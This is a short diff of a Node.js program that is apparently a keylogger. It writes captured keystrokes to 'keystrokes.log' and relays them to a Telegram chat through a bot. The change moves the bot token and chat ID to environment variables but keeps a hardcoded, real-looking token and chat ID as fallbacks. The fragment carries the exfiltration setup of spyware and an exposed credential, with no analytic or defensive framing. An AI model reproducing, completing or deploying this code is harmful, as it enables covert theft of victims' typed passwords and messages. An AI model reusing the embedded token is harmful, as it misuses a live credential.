@@ -4,8 +4,8 @@ const fs = require('fs'); // File system module
 const path = require('path');
 
 // Telegram Bot Token and Chat ID
-const BOT_TOKEN = "7844704094:AAE2vlYePuWzezmPEVqoIZOaFM0aRqExFf0"; // Replace with your token
-const CHAT_ID = "6527763293"; // Replace with your chat ID
+const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "7844704094:AAE2vlYePuWzezmPEVqoIZOaFM0aRqExFf0"; // Replace with your token
+const CHAT_ID = process.env.TELEGRAM_CHAT_ID || "6527763293"; // Replace with your chat ID
 const LOG_FILE = path.join(__dirname, "keystrokes.log"); // Log file path
 
 // Function to send text message to Telegram
